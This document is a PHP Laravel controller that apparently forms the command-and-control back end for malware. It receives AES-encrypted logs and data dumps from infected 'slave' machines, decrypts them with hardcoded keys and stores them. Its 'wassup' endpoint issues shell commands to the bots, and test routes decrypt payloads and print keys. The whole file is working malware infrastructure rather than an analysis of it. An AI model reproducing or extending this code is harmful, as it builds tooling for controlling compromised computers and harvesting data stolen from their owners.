<?php

namespace App\Http\Controllers;

use AES;
use Validator;
use Exception;
use Illuminate\Http\Request;
use App\Repositories\LogRepository as Logs;
use App\Repositories\DumpRepository as Dumps;
use App\Repositories\SlaveRepository as Slaves;

class ApiController extends Controller {

    private $logs;
    private $dumps;
    private $slaves;

    public function __construct(Logs $logs, Dumps $dumps, Slaves $slaves)
    {
        $this->logs = $logs;
        $this->dumps = $dumps;
        $this->slaves = $slaves;
    }

    // Receive logs
    public function purr(Request $request)
    {
        try
        {
            $ctxt = base64_decode($request->input("data"));

            $iv    = 'SbkJ1i1S9eh9Ggqb';
            $key   = '8NxoEQemMLqfqbpoq6hhufGmbawy3wS9';
            $plain = preg_replace('/[\x00-\x1F\x7F]/', '', substr($this->decrypt($ctxt, $iv, $key), 16));
            $data  = json_decode($plain);

            if( ! $data or ! isset($data->data) or count($data->data) == 0 ) throw new Exception("Grr");

            $slave = $this->slaves->findOrCreate($data->ip, $data->name);
            $log = $this->logs->create(['slave_id' => $slave->id, 'data' => base64_encode(serialize($data->data))]);

            return response()->json(['status' => 'success']);
        }
        catch(Exception $e)
        {
            return response()->json(['status' => 'error', 'error' => $e->getMessage()]);
        }
    }

    // Receive dumps
    public function burr(Request $request)
    {
        try
        {
            $ctxt  = base64_decode($request->input("data"));
            $iv    = 'giSvePLNOSitziq5';
            $key   = 'ttS8sTelAUHQhVJ2ylXRQ3w8sh8rSNPe';
            $plain = preg_replace('/[\x00-\x1F\x7F]/', '', substr($this->decrypt($ctxt, $iv, $key), 16));
            $data  = json_decode($plain);

            if( ! $data or ! isset($data->dump) or $data->dump == "" ) throw new Exception("Grrr");

            $slave = $this->slaves->findOrCreate($data->ip, $data->name);
            $dump  = $this->dumps->create(['slave_id' => $slave->id, 'data' => base64_encode(serialize($data->dump))]);

            return response()->json(['status' => 'success']);
        }
        catch(Exception $e)
        {
            return response()->json(['status' => 'error', 'error' => $e->getMessage()]);
        }
    }

    // Send out commands
    public function wassup($i)
    {
        return response()->json(['commands' => ['dir', 'mkdir hihi']]);
    }

    // AES decryption function
    private function decrypt($data, $iv, $key){
        $cipher = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');
        if(is_null($iv)){
            $ivlen = mcrypt_enc_get_iv_size($cipher);
            $iv    = substr($data, 0, $ivlen);
            $data  = substr($data, $ivlen);
        }
        if(mcrypt_generic_init($cipher, $key, $iv) != -1){
            $decrypted = mdecrypt_generic($cipher, $data);
            mcrypt_generic_deinit($cipher);
            mcrypt_module_close($cipher);
            return $decrypted;
        }
        return false;
    }

    /*
     *
     * Tests
     *
    */

    public function test()
    {
        return view('test');
    }

    public function postTest(Request $request)
    {
        if( ! $request->has("data") ) return redirect()->back()->withErrors(['error' => 'No crypted text was given']);

        $data = base64_decode($request->input("data"));

        $iv = substr($data, 0, 16);
        $ct = substr($data, 16);

        $cipher = new \Crypt_AES(); // could use CRYPT_AES_MODE_CBC
        $cipher->setKey('6cNHVCv3LgKbwuwkfKtyyYR1Pxlj1ER5');
        $cipher->setIV($iv);

        $plaintext = base64_decode($cipher->decrypt($ct));
        return $plaintext;
    }

    public function testAES()
    {
        return view('test-aes');
    }

    public function postTestAES(Request $request)
    {
        $v = Validator::make($request->all(), [
            'password' => 'required',
            'data' => 'required'
        ]);

        if($v->fails()) return redirect()->back()->withErrors($v->errors());

        $rawData = base64_decode($request->input("data"));
        $iv = substr($rawData, 0, 16);
        $ctext = substr($rawData, 16);
        $cipher = new \Crypt_AES();
        $cipher->setIV($iv);
        $cipher->setKey($request->input("password"));
        $ptext = $cipher->decrypt($ctext);
        return nl2br($ptext);
    }

    public function testEncryption()
    {
        return view('test-encryption');
    }

    public function postTestEncryption(Request $request)
    {
        $cipher = new \Crypt_AES(CRYPT_AES_MODE_CFB);
        $iv = "YD0wM0hcRU1gIzVPI05xOQ==";
        $key = "VXFCaG5IJFpwTj5LaUl2aCgsdFtCJ1NwPUt0K1cleyo=";
        $cipher->setKey(base64_decode($key));
        $cipher->setIV(base64_decode($iv));
        $plaintext = "testing bitches";
        $ciphertext = base64_encode($cipher->encrypt($plaintext));
        echo "KEY: '".$key."'<br/>";
        echo "IV: '".$iv."'<br/>";
        echo "CT: '".$ciphertext."'";
    }

}
